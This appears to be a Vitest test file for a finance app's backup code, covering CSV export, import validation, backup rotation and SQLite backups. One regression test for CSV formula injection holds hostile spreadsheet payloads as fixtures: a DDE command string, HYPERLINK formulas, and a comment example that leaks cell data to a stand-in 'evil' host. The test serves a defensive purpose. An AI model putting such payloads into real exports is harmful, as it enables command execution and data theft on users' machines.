import { describe, it, expect, beforeEach } from 'vitest';
import { createTestDb } from './helpers/test-db';
import { runMigrations } from '$lib/db/migrations/runner';
import { migrations } from '$lib/db/migrations/index';
import { exportCsv, validateImport, getBackupsToDelete, createBackup } from '$lib/backup';
import * as accounts from '$lib/db/repos/accounts';
import type { DatabaseService } from '$lib/db/service';
import { existsSync, mkdtempSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import BetterSqlite3 from 'better-sqlite3';

let db: DatabaseService;

beforeEach(async () => {
	db = createTestDb();
	await runMigrations(db, migrations);
});

describe('exportCsv', () => {
	it('exports tables as CSV', async () => {
		await accounts.createAccount(db, { name: 'Test', type: 'checking', currency: 'VND' });
		const csvMap = await exportCsv(db);
		expect(csvMap.has('accounts')).toBe(true);
		const csv = csvMap.get('accounts')!;
		expect(csv).toContain('id,');
		expect(csv).toContain('Test');
	});

	it('handles empty tables', async () => {
		const csvMap = await exportCsv(db);
		expect(csvMap.get('transactions')).toBe('');
	});

	it('neutralizes CSV formula injection in user content', async () => {
		// A payee/description beginning with = + - @ or TAB is executed as a
		// formula when the CSV is opened in Excel/LibreOffice — a real
		// exfiltration vector (=HYPERLINK("http://evil/?x="&A1)). csvEscape must
		// prefix such values with a single quote so spreadsheets treat them as
		// text. Today it only escapes , " \n and passes formulas through verbatim.
		const id = await accounts.createAccount(db, { name: '=CMD|"/c calc"!A1', type: 'checking', currency: 'VND' });
		await db.execute(
			`INSERT INTO transactions (id, kind, date, amount, account_id, tag_id, payee, created_at, updated_at)
			 VALUES (?, 'expense', ?, 1000, ?, 'tag_loss', '+1+HYPERLINK("http://evil")', ?, ?)`,
			['tx1', '2026-01-01', id, '2026-01-01', '2026-01-01']
		);
		const csvMap = await exportCsv(db);
		const accountsCsv = csvMap.get('accounts')!;
		// The leading = must be neutralized to a text literal.
		expect(accountsCsv).toContain("'=CMD|");
		expect(accountsCsv).not.toMatch(/[^']=[A-Z]/); // no un-neutralized =formula
		const txnsCsv = csvMap.get('transactions')!;
		expect(txnsCsv).toContain("'+1+HYPERLINK");
	});
});

describe('validateImport', () => {
	it('validates a correct database', async () => {
		const result = await validateImport(db, 3);
		expect(result.valid).toBe(true);
	});

	it('rejects wrong schema version', async () => {
		const result = await validateImport(db, 99);
		expect(result.valid).toBe(false);
		expect(result.error).toContain('Schema version mismatch');
	});
});

describe('getBackupsToDelete', () => {
	it('returns empty when under limit', () => {
		const backups = Array.from({ length: 5 }, (_, i) => ({
			path: `/backup/${i}.sqlite`, timestamp: `2026-05-${String(i + 1).padStart(2, '0')}`, size: 1000
		}));
		expect(getBackupsToDelete(backups)).toHaveLength(0);
	});

	it('returns oldest when over limit', () => {
		const backups = Array.from({ length: 12 }, (_, i) => ({
			path: `/backup/${i}.sqlite`, timestamp: `2026-05-${String(i + 1).padStart(2, '0')}`, size: 1000
		}));
		const toDelete = getBackupsToDelete(backups, 10);
		expect(toDelete).toHaveLength(2);
	});
});

describe('createBackup', () => {
	it('writes a valid backup file via VACUUM INTO', async () => {
		const db = createTestDb();
		await runMigrations(db, migrations);
		// Seed a row so the backup isn't empty.
		await db.execute(
			`INSERT INTO accounts (id, name, type, currency, created_at, updated_at)
			 VALUES ('01TEST', 'Checking', 'checking', 'VND', '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z')`
		);

		const tmpDir = mkdtempSync(join(tmpdir(), 'notchy-backup-'));
		try {
			const path = await createBackup(db, tmpDir);
			// Path is the full file under backupDir.
			expect(path.startsWith(tmpDir)).toBe(true);
			expect(path.endsWith('.sqlite')).toBe(true);
			expect(existsSync(path)).toBe(true);
			// The backup is a real SQLite file — reopen it and confirm the row survived.
			const backup = new BetterSqlite3(path, { readonly: true });
			const rows = backup.prepare('SELECT name FROM accounts').all();
			expect(rows.length).toBe(1);
			backup.close();
		} finally {
			rmSync(tmpDir, { recursive: true, force: true });
		}
	});
});
